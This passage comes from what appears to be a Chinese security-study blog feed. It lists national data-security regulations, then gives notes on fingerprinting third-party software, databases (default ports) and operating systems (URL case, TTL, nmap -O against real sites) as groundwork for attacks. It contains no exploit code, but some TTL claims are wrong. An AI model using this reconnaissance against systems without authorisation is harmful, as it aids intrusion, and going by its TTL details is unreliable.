disabled="" type="checkbox"> </p><h5 id="《互联网信息服务算法推荐管理规定（征求意见稿）》"><a href="#《互联网信息服务算法推荐管理规定（征求意见稿）》" class="headerlink" title="《互联网信息服务算法推荐管理规定（征求意见稿）》"></a>《互联网信息服务算法推荐管理规定（征求意见稿）》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2021年8月27</span>日<br><br>行业属性：全行业（针对互联网传输的数据）<br><br>有关概述：明确要求算法推荐服务提供者应当落实算法安全主体责任，建立健全用户注册、信息发布审核、算法机制机理审核、安全评估监测、安全事件应急处置、数据安全保护和个人信息保护等管理制度，制定并公开算法推荐相关服务规则，配备与算法推荐服务规模相适应的专业人员和技术支撑。<br></code></pre></td></tr></table></figure></li><li><p><input disabled="" type="checkbox"> </p><h5 id="《“十四五”新型基础设施建设规划》"><a href="#《“十四五”新型基础设施建设规划》" class="headerlink" title="《“十四五”新型基础设施建设规划》"></a>《“十四五”新型基础设施建设规划》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2021年9月22</span>日<br><br>行业属性：全行业<br><br>有关概述：建立完善安全监管体系，增强安全保障能力。<br></code></pre></td></tr></table></figure></li><li><p><input disabled="" type="checkbox"> </p><h5 id="《国家标准化发展纲要》"><a href="#《国家标准化发展纲要》" class="headerlink" title="《国家标准化发展纲要》"></a>《国家标准化发展纲要》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2021年10月10</span>日<br><br>行业属性：全行业（针对互联网传输的数据）<br><br>有关概述：规定互联网用户账号服务平台应当采取必要措施，确保其收集、存储的个人信息及账号名称信息安全；未经使用者授权同意，不得收集、存储、使用、加工、传输、提供或者公开个人信息及账号名称信息。不得非法买卖互联网用户账号名称信息。<br></code></pre></td></tr></table></figure></li><li><p><input disabled="" type="checkbox"> </p><h5 id="《数据出境安全评估办法（征求意见稿）》"><a href="#《数据出境安全评估办法（征求意见稿）》" class="headerlink" title="《数据出境安全评估办法（征求意见稿）》"></a>《数据出境安全评估办法（征求意见稿）》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2021年10月29</span>日<br><br>行业属性：全行业（针对出境范围的数据）<br><br>有关概述：旨在规范数据出境活动，保护个人信息权益，维护国家安全和社会公共利益，促进数据跨境安全、自由流动。<br></code></pre></td></tr></table></figure></li><li><p><input disabled="" type="checkbox"> </p><h5 id="《网络数据安全管理条例（征求意见稿）》"><a href="#《网络数据安全管理条例（征求意见稿）》" class="headerlink" title="《网络数据安全管理条例（征求意见稿）》"></a>《网络数据安全管理条例（征求意见稿）》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布日期：<span class="hljs-number">2021年11月14</span>日<br><br>行业属性：全行业<br><br>有关概述：根据《网络安全法》《数据安全法》《个人信息保护法》等法律，落实数据分级分类保护制度，对一般数据、个人信息、重要数据等如何保护给出了具体要求。<br></code></pre></td></tr></table></figure></li><li><p><input disabled="" type="checkbox"> </p><h5 id="《国家安全战略》"><a href="#《国家安全战略》" class="headerlink" title="《国家安全战略》"></a>《国家安全战略》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2021年11月18</span>日<br><br>行业属性：全行业<br><br>有关概述：加快数据安全的治理能力<br></code></pre></td></tr></table></figure></li><li><p><input disabled="" type="checkbox"> </p><h5 id="《“十四五”推动高质量发展的国家标准体系建设规划》"><a href="#《“十四五”推动高质量发展的国家标准体系建设规划》" class="headerlink" title="《“十四五”推动高质量发展的国家标准体系建设规划》"></a>《“十四五”推动高质量发展的国家标准体系建设规划》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2021年12月14</span>日<br><br>行业属性：全行业<br><br>有关概述：提出推动关键信息基础设施安全保护、数据安全、个人信息保护、数据出境安全管理、网络安全审查、网络空间可信身份、网络产品和服务、供应链安全、<span class="hljs-number">5</span>G安全、智慧城市安全、物联网安全、工业互联网安全、车联网安全、人工智能安全等重点领域国家标准研制<br></code></pre></td></tr></table></figure></li><li><p><input disabled="" type="checkbox"> </p><h5 id="《“十四五”国家信息化规划》"><a href="#《“十四五”国家信息化规划》" class="headerlink" title="《“十四五”国家信息化规划》"></a>《“十四五”国家信息化规划》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2021年12月27</span>日<br><br>行业属性：全行业<br><br>有关概述：强化数据安全保障。加强数据收集、汇聚、存储、流通、应用等全生命周期的安全管理，建立健全相关技术保障措施。建立数据分类分级管理制度和个人信息保护认证制度，强化数据安全风险评估、监测预警、检测认证和应急处置，加强对重要数据、企业商业秘密和个人信息的保护，规范对未成年人个人信息的使用。<br></code></pre></td></tr></table></figure></li><li><p><input disabled="" type="checkbox"> </p><h5 id="《网络安全审查办法》"><a href="#《网络安全审查办法》" class="headerlink" title="《网络安全审查办法》"></a>《网络安全审查办法》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2022年2月15</span>日<br><br>行业属性：全行业<br><br>有关概述：网络平台运营者开展数据处理活动影响或者可能影响国家安全等情形纳入网络安全审查范围，并明确要求掌握超过<span class="hljs-number">100</span>万用户个人信息的网络平台运营者赴国外上市必须申报网络安全审查<br></code></pre></td></tr></table></figure></li></ul><h4 id="2-政务层面："><a href="#2-政务层面：" class="headerlink" title="2.政务层面："></a>2.政务层面：</h4><ul><li><h5 id="《政务信息资源共享管理暂行办法》"><a href="#《政务信息资源共享管理暂行办法》" class="headerlink" title="《政务信息资源共享管理暂行办法》"></a>《政务信息资源共享管理暂行办法》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间<span class="hljs-number">2016年9月19</span>日<br><br>政务方向：国务院下属部门（针对政务数据）<br><br>有关概述：共享平台管理单位要加强共享安全防护。切实保障政务信息资源共享交换时的数据安全<br></code></pre></td></tr></table></figure></li><li><h5 id="《关于印发政府网站发展指引通知》"><a href="#《关于印发政府网站发展指引通知》" class="headerlink" title="《关于印发政府网站发展指引通知》"></a>《关于印发政府网站发展指引通知》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2017年6月8</span>日<br><br>政务方向：国务院下属部门（针对政务数据）<br><br>有关概述：加强网站平台的用户数据安全防护工作，建立政府网站信息数据安全保护制度、收集、使用用户信息数据应当遵循合法、正当、必要的原则<br></code></pre></td></tr></table></figure></li><li><h5 id="《关于印发进一步深化“互联网-政务服务”推进政务服务“一网、一门、一次”改革实施方案的通知》"><a href="#《关于印发进一步深化“互联网-政务服务”推进政务服务“一网、一门、一次”改革实施方案的通知》" class="headerlink" title="《关于印发进一步深化“互联网+政务服务”推进政务服务“一网、一门、一次”改革实施方案的通知》"></a>《关于印发进一步深化“互联网+政务服务”推进政务服务“一网、一门、一次”改革实施方案的通知》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2018年6月22</span>日<br><br>政务方向：国务院下属部门（针对政务数据）<br><br>有关概述：要依法加强隐私等信息保护。研究政务信息资源分类分级制度，制定数据安全管理办法，明确数据采集、传输、存储、使用、共享、开放等环节安全保障的措施、责任主体和具体要求。<br></code></pre></td></tr></table></figure></li><li><h5 id="《关于加快推进全国一体化在线服务平台建设的指导意见》"><a href="#《关于加快推进全国一体化在线服务平台建设的指导意见》" class="headerlink" title="《关于加快推进全国一体化在线服务平台建设的指导意见》"></a>《关于加快推进全国一体化在线服务平台建设的指导意见》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2019年8月8</span>日<br><br>政务方向：国务院下属部门（针对政务数据）<br><br>有关概述：强化数据使用方责任，加强共享数据使用全过程管理，确保数据安全。制定全国一体化在线政务服务平台数据安全管理办法，加强对涉及国家利益、公共安全、商业秘密、个人隐私等重要信息的保护和管理，加强政务大数据安全管理。<br></code></pre></td></tr></table></figure></li><li><h5 id="《国务院政务信息化项目建设管理办法》"><a href="#《国务院政务信息化项目建设管理办法》" class="headerlink" title="《国务院政务信息化项目建设管理办法》"></a>《国务院政务信息化项目建设管理办法》</h5><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs abnf">发布时间<span class="hljs-comment">;2020年2月1日</span><br><br>政务方向：国务院下属部门（针对政务数据）<br><br>有关概述：部门应当严格遵守有关保密等法律法规规定，构建全方位、多层次、一致性的防护体系，按要求采用密码技术，并定期开展密码应用安全性评估，确保政务信息系统运行安全和政务信息资源共享交换的数据安全。<br></code></pre></td></tr></table></figure></li><li><h5 id="《关于档案部门使用政务云平台过程中加强档案信息安全管理的意见》"><a href="#《关于档案部门使用政务云平台过程中加强档案信息安全管理的意见》" class="headerlink" title="《关于档案部门使用政务云平台过程中加强档案信息安全管理的意见》"></a>《关于档案部门使用政务云平台过程中加强档案信息安全管理的意见》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2020年5月6</span>日<br><br>政务方向：档案局<br><br>有关概述：切实加强档案部门使用政务云平台过程中的档案信息安全管理<br></code></pre></td></tr></table></figure></li><li><h5 id="《人民检查院办理网络犯罪安全规定》"><a href="#《人民检查院办理网络犯罪安全规定》" class="headerlink" title="《人民检查院办理网络犯罪安全规定》"></a>《人民检查院办理网络犯罪安全规定》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2021年1月22</span>日<br><br>政务方向：人民检察院<br><br>有关概述：明确按照刑事诉讼流程规范网络犯罪案件办理，突出电子数据的收集、提取、审查的规范要求，注重办案与技术融合，突出统筹协作办案，充分发挥检察职能，全面提升检察机关办理网络犯罪案件的专业化水平，推进网络空间治理。<br></code></pre></td></tr></table></figure></li><li><h5 id="《涉密信息系统集成资质管理办法》"><a href="#《涉密信息系统集成资质管理办法》" class="headerlink" title="《涉密信息系统集成资质管理办法》"></a>《涉密信息系统集成资质管理办法》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2021年3月1</span>日<br><br>政务方向：保密局<br><br>有关概述：将涉密集成资质分为甲级和乙级两个等级，明确了涉密集成资质的申请、受理、审查、决定、使用和监督管理规定。<br></code></pre></td></tr></table></figure></li><li><h5 id="《全国一体化大数据中心协同创新体系算力枢纽实施方案》。"><a href="#《全国一体化大数据中心协同创新体系算力枢纽实施方案》。" class="headerlink" title="《全国一体化大数据中心协同创新体系算力枢纽实施方案》。"></a>《全国一体化大数据中心协同创新体系算力枢纽实施方案》。</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2021年5月24</span><br><br>政务方向：国务院下属部门（针对政务数据）<br></code></pre></td></tr></table></figure></li><li><h5 id="《全国一体化政务服务平台移动端建设指南》"><a href="#《全国一体化政务服务平台移动端建设指南》" class="headerlink" title="《全国一体化政务服务平台移动端建设指南》"></a>《全国一体化政务服务平台移动端建设指南》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2021年11月12</span>日<br><br>政务方向：国务院下属部门（针对政务数据）<br><br>有关概述：坚持安全可控工作原则。全面落实总体国家安全观，树牢网络安全底线思维，统筹发展和安全，增强移动政务服务一体化安全防护能力，加强对重要政务数据、敏感个人信息等的保护，确保政务网络和数据信息安全<br></code></pre></td></tr></table></figure></li><li><h5 id="《“十四五”推进国家政务信息化规划》"><a href="#《“十四五”推进国家政务信息化规划》" class="headerlink" title="《“十四五”推进国家政务信息化规划》"></a>《“十四五”推进国家政务信息化规划》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2021年12月24</span>日<br><br>政务方向：国务院下属部门（针对政务数据）<br></code></pre></td></tr></table></figure></li></ul><p><strong>小结（不一定对）：</strong>自我感觉分清政务行业层面和国家层面的主要依据是根据看法律法规对象的主体是谁，如果总体明显是各行业的数据内容，说明是国家层面对数据安全的发展规划和布局。对于政务行业层面而言，政务是指国家政府机构的事务性工作，也就是法律法规针对的对象是政府机构，例如国务院旗下的27个部门，他们对于政务信息数据的处理行为和方向。</p><h4 id="3-广东省层面："><a href="#3-广东省层面：" class="headerlink" title="3.广东省层面："></a>3.广东省层面：</h4><ul><li><h5 id="《广东省政务数据资源共享管理办法（试行）》"><a href="#《广东省政务数据资源共享管理办法（试行）》" class="headerlink" title="《广东省政务数据资源共享管理办法（试行）》"></a>《广东省政务数据资源共享管理办法（试行）》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2019年1月1</span>日<br><br>归属：政务行业<br></code></pre></td></tr></table></figure></li><li><h5 id="《广东省人民政府办公厅关于印发广东省数字政府改革建设2021年工作要点的通知》"><a href="#《广东省人民政府办公厅关于印发广东省数字政府改革建设2021年工作要点的通知》" class="headerlink" title="《广东省人民政府办公厅关于印发广东省数字政府改革建设2021年工作要点的通知》"></a>《广东省人民政府办公厅关于印发广东省数字政府改革建设2021年工作要点的通知》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2021年7月22</span>日<br><br>归属：政务行业<br></code></pre></td></tr></table></figure></li><li><h5 id="《广东省数字经济促进条例》"><a href="#《广东省数字经济促进条例》" class="headerlink" title="《广东省数字经济促进条例》"></a>《广东省数字经济促进条例》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2021年9月1</span>日<br><br>归属:政务行业<br></code></pre></td></tr></table></figure></li><li><h5 id="《广东省公共数据安全管理办法（二次征求意见稿）》"><a href="#《广东省公共数据安全管理办法（二次征求意见稿）》" class="headerlink" title="《广东省公共数据安全管理办法（二次征求意见稿）》"></a>《广东省公共数据安全管理办法（二次征求意见稿）》</h5><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns">发布时间：<span class="hljs-number">2022年2月7</span>日<br><br>归属:政务行业<br></code></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    <categories>
      
      <category>五所实习之数据安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>第三方层面</title>
    <link href="/2022/07/22/%E7%AC%AC%E4%B8%89%E6%96%B9%E5%B1%82%E9%9D%A2/"/>
    <url>/2022/07/22/%E7%AC%AC%E4%B8%89%E6%96%B9%E5%B1%82%E9%9D%A2/</url>
    
    <content type="html"><![CDATA[<h1 id="第三方层面"><a href="#第三方层面" class="headerlink" title="第三方层面"></a>第三方层面</h1><h2 id="1-常见的第三方"><a href="#1-常见的第三方" class="headerlink" title="1.常见的第三方"></a>1.常见的第三方</h2><ul><li>Jboss</li><li>PHPmyadmin</li><li>vsftpd</li><li>teamview</li><li>自己下载的其他软件（比如谷歌浏览器）</li></ul><h2 id="2-如何判断第三方平台"><a href="#2-如何判断第三方平台" class="headerlink" title="2.如何判断第三方平台"></a>2.如何判断第三方平台</h2><p>&emsp;&emsp;不同的第三方平台所判断的方法和标准都不相同，譬如phpmyadmin的判定是可以通过网站扫描其目录来判定，如果网站扫描不出来，可以尝试端口等方法去判断。如果nmap扫描不出来，可能是有第三方防护软件（安全狗）等拦截。还有可能是对方服务部署在内网。</p><p>&emsp;&emsp;总而言之，判断第三方层面需要多层面多方法的进行，需要进行积累和沉淀。</p><h2 id="3-为什么要识别第三方平台或软件"><a href="#3-为什么要识别第三方平台或软件" class="headerlink" title="3.为什么要识别第三方平台或软件"></a>3.为什么要识别第三方平台或软件</h2><p>&emsp;&emsp;不同的第三方软件或工具存在不同的漏洞、识别到更多的信息对收集到的漏洞也就越多。</p><h2 id="4-第三方平台或软件被攻击的危害"><a href="#4-第三方平台或软件被攻击的危害" class="headerlink" title="4.第三方平台或软件被攻击的危害"></a>4.第三方平台或软件被攻击的危害</h2><p>  &emsp;&emsp;直接获取到软件的权限便于进一步的提权和攻击。</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>数据库层面</title>
    <link href="/2022/07/21/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%B1%82%E9%9D%A2/"/>
    <url>/2022/07/21/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%B1%82%E9%9D%A2/</url>
    
    <content type="html"><![CDATA[<h1 id="数据库层面"><a href="#数据库层面" class="headerlink" title="数据库层面"></a>数据库层面</h1><h2 id="1-常见的数据库类型"><a href="#1-常见的数据库类型" class="headerlink" title="1.常见的数据库类型"></a>1.常见的数据库类型</h2><h5 id="emsp-1-小型数据库"><a href="#emsp-1-小型数据库" class="headerlink" title="&emsp;1)小型数据库"></a>&emsp;1)小型数据库</h5><p>   &emsp;&emsp; Access</p><h5 id="emsp-2）中型数据库"><a href="#emsp-2）中型数据库" class="headerlink" title="&emsp;2）中型数据库"></a>&emsp;2）中型数据库</h5><p>  &emsp;&emsp;  MySQL</p><h5 id="emsp-3）大型数据库"><a href="#emsp-3）大型数据库" class="headerlink" title="&emsp;3）大型数据库"></a>&emsp;3）大型数据库</h5><p>  &emsp;&emsp;  Oracle、SQL Server</p><h2 id="2-数据库区分"><a href="#2-数据库区分" class="headerlink" title="2.数据库区分"></a>2.数据库区分</h2><h5 id="emsp-1）数据库常见搭配"><a href="#emsp-1）数据库常见搭配" class="headerlink" title="&emsp;1）数据库常见搭配"></a>&emsp;1）数据库常见搭配</h5><p>&emsp;&emsp;往往由于兼容性的问题，不同数据库所配合的搭建语言是不一样的，一般都是选取兼容性比较高的搭配，比如：</p><p>&emsp;&emsp;&emsp;ASP+Access，sql server （windows）</p><p>&emsp;&emsp;&emsp;PHP+Mysql（linux、windows） 端口：3306</p><p>&emsp;&emsp;&emsp;ASPX+Mssql(windows) 端口：1433</p><p>&emsp;&emsp;&emsp;Jsp+Mssql（windows）,oracle （linux、windows）端口：1521</p><p>&emsp;&emsp;&emsp;Python+Mongodb （linux、windows）</p><p>  &emsp;&emsp;注：其中的access和mssql是windows官方的数据库，所以是不支持Liunx系统的。</p><h5 id="emsp-2）常见的数据库端口号（默认）"><a href="#emsp-2）常见的数据库端口号（默认）" class="headerlink" title="&emsp;2）常见的数据库端口号（默认）"></a>&emsp;2）常见的数据库端口号（默认）</h5><h6 id="emsp-emsp-关系型数据库："><a href="#emsp-emsp-关系型数据库：" class="headerlink" title="&emsp;&emsp;关系型数据库："></a>&emsp;&emsp;关系型数据库：</h6><p>&emsp;&emsp;&emsp;sql server——–端口：1433</p><p>&emsp;&emsp;&emsp;Mysql————-端口：3306</p><p>&emsp;&emsp;&emsp;Oracle————-端口：1521</p><p>&emsp;&emsp;&emsp;PostgreSQL——–端口：5432</p><p>&emsp;&emsp;&emsp;SM达梦————-端口：5236</p><h6 id="emsp-emsp-非关系型数据库："><a href="#emsp-emsp-非关系型数据库：" class="headerlink" title="&emsp;&emsp;非关系型数据库："></a>&emsp;&emsp;非关系型数据库：</h6><p>&emsp;&emsp;&emsp;Mongodb———端口：27017</p><p>&emsp;&emsp;&emsp;Redis—————端口：6379</p><p>&emsp;&emsp;&emsp;Memcached——–端口：11211</p><h5 id="emsp-3）nmap扫描识别数据库类型"><a href="#emsp-3）nmap扫描识别数据库类型" class="headerlink" title="&emsp;3）nmap扫描识别数据库类型"></a>&emsp;3）nmap扫描识别数据库类型</h5><p><img src="/img/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%B1%82%E9%9D%A2/1.png"></p><p>&emsp;&emsp;其中的STATE是代表端口的状态，状态主要就分为几种：</p><p> &emsp;&emsp;&emsp; Open：端口处于开放状态</p><p> &emsp;&emsp;&emsp; Closed：端口处于关闭状态</p><p>  &emsp;&emsp;&emsp;Filtered：端口处于过了无法收到返回的probe状态</p><p>  &emsp;&emsp;&emsp;UnFiltered：端口收到返回的probe，但无法确认</p><p>  &emsp;&emsp;&emsp;Open/UnFiltered：端口处于开放或者未过滤状态</p><h2 id="3-数据库创建漏洞类型及攻击"><a href="#3-数据库创建漏洞类型及攻击" class="headerlink" title="3.数据库创建漏洞类型及攻击"></a>3.数据库创建漏洞类型及攻击</h2><p>&emsp;&emsp;&emsp;数据库的不同代表其结构和相关的编译语言不同，每个数据库，他的安全机制和写法结构都有少许的不一样，所以他产生和存在的漏洞也就不同。比如以Access与Mysql数据库进行比较，不仅仅有存储方式上的区别，也有结构方面的区别。数据库的结构，架构的不同，决定了我们所攻击的方法和入手的地方。</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>操作系统层面</title>
    <link href="/2022/07/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%B1%82%E9%9D%A2/"/>
    <url>/2022/07/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%B1%82%E9%9D%A2/</url>
    
    <content type="html"><![CDATA[<h1 id="操作系统层面"><a href="#操作系统层面" class="headerlink" title="操作系统层面"></a>操作系统层面</h1><h2 id="1-识别操作系统常见方法"><a href="#1-识别操作系统常见方法" class="headerlink" title="1.识别操作系统常见方法"></a>1.识别操作系统常见方法</h2><h5 id="1）通过网站识别"><a href="#1）通过网站识别" class="headerlink" title="1）通过网站识别"></a>1）通过网站识别</h5><p>window:</p><p>&emsp;&emsp;通过网站或通过扫描相关软件识别大小写对网页都没有影响，这种情况就可以认定为windows服务器，因为windows服务器不区分大小写。以小迪吧的某个界面（<a href="http://xiaodi8.com/?Id=211%EF%BC%89%E4%B8%BA%E4%BE%8B%EF%BC%9A">http://xiaodi8.com/?Id=211）为例：</a></p><p><img src="/img/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%B1%82%E9%9D%A2/1.png"></p><p><img src="/img/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%B1%82%E9%9D%A2/2.png"></p><p>&emsp;&emsp;通过图片可以看见，在输入网址的时候，输入id与ID都是能够访问网站的。</p><p>Linux:</p><p>&emsp;&emsp; Linux是区分大小写的，因此可以通过修改大小从而判断操作系统的类别。以“嵩基集团”的网址（<a href="http://www.hnsjjt.com/index.php%EF%BC%89%E4%B8%BA%E4%BE%8B%E5%AD%90">http://www.hnsjjt.com/index.php）为例子</a></p><p><img src="/img/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%B1%82%E9%9D%A2/3.png"></p><p><img src="/img/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%B1%82%E9%9D%A2/5.png"></p><p>&emsp;&emsp;通过图片可以看见，在输入网址的时候，php和phP的最终效果是不一样的，当改为大写P的时候，访问网站会反馈出not found的结果。</p><h5 id="2）TTL值识别（不建议，存在一定标准问题）"><a href="#2）TTL值识别（不建议，存在一定标准问题）" class="headerlink" title="2）TTL值识别（不建议，存在一定标准问题）"></a>2）TTL值识别（不建议，存在一定标准问题）</h5><p>&emsp;&emsp;例如：</p><p>windows NT/2000     TLL：128</p><p>windows 95/98           TLL：32</p><p>win7                               TLL：64</p><p>unix                                 TLL:255</p><p>Linux                               TLL：64</p><p><img src="/img/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%B1%82%E9%9D%A2/6.png"></p><p>&emsp;&emsp;当然，并不是全部的TTL都能反馈出操作系统的类型，当我们ping百度的网站时，显示的TTL值是56，TL是生存时间(Time To Live) 简单点说就是数据包的生命周期，TTL=56，就是该数据只能在通讯线路里存活56秒，并没有反馈出所谓的操作系统类型，当我们ping广州大学的网址时，也可能出现没有所谓TTL值的情况。<br>        &emsp;&emsp;简单来说，这个TTL是很又有用的，它能把无主数据包自动消灭。如果无主数据包不会自动消灭，那么大量的无主数据包就会堵在通讯线路上，导致网络堵塞</p><h5 id="3）nmap识别"><a href="#3）nmap识别" class="headerlink" title="3）nmap识别"></a>3）nmap识别</h5><p>&emsp;&emsp;这里我使用的是kali自带的nmap，使用命令：nmap -O 183.232.231.174（也就是百度的网址）</p><p><img src="/img/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%B1%82%E9%9D%A2/7.png"></p><p>&emsp;&emsp;可以看见，百度所使用的操作系统类型为Linux的系统，如果我们想发起操作系统层面的攻击的话，即就从对应Linux操作系统类型的漏洞入手。</p><h2 id="2-识别操作系统的区别和意义"><a href="#2-识别操作系统的区别和意义" class="headerlink" title="2.识别操作系统的区别和意义"></a>2.识别操作系统的区别和意义</h2><h5 id="1）区别"><a href="#1）区别" class="headerlink" title="1）区别"></a>1）区别</h5><p>windows：</p><p>&emsp;&emsp;对于windows而言，Windows系统内置了许多本地用户组，这些用户组本身都已经被赋予一些权限（permissions),它们具有管理本地计算机或访问本地资源的权限。只要用户账户加入到这些本地组内，这回用户账户也将具备该组所拥有的权限。</p><p>&emsp;&emsp; 默认情况下，系统为用户分了7个组，并给每个组赋予不同的操作权限，管理员组(Administrators)、高权限用户组(Power Users)、普通用户组(Users)、备份操作组(Backup Operators)、文件复制组(Replicator)、来宾用户组(Guests)，身份验证用户组(Ahthenticated users)其中备份操作组和文件复制组为维护系统而设置，平时不会被使用。</p><p> &emsp;&emsp;除了上面提到的7个默认权限分组，系统还存在一些特殊权限成员，这些成员是为了特殊用途而设置，分别是:SYSTEM(系统)、Trustedinstaller（信任程序模块）、Everyone(所有人)、CREATOR OWNER(创建者) 等，这些特殊成员不被任何内置用户组吸纳，属于完全独立出来的账户。</p><p> &emsp;&emsp;真正拥有“完全访问权”的只有一个成员:SYSTEM。这个成员是系统产生的，真正拥有整台计算机管理权限的账户，一般的操作是无法获取与它等价的权限的</p><p>Linux：</p><p>&emsp;&emsp; 对于Linux系统而言。Linux/Unix是一个多用户、多任务的操作系统；用户在系统中是分角色的，在Linux系统中，由于角色的不同，权限和所完成的任务也不同；值得注意的是用户的角色是通过UID和GID识别的；特别是UID，在运维工作中，一个UID是唯一标识一个系统用户的账号，其中超级用户root（0） 程序用户（1<del>499） 普通用户（500</del>65535）。</p><p>  &emsp;&emsp;具体的详细区别可以自行百度，这个会有很好的介绍。</p><h5 id="2）意义"><a href="#2）意义" class="headerlink" title="2）意义"></a>2）意义</h5><p>   &emsp;&emsp; 围绕着不同的操作系统进行不同的漏洞查找和搜寻，不同操作系统的漏洞体现存在差异，所以当我们判断出是哪种操作系统类型时，我们就可以“对症下药”。</p><h2 id="3-操作系统层面漏洞类型"><a 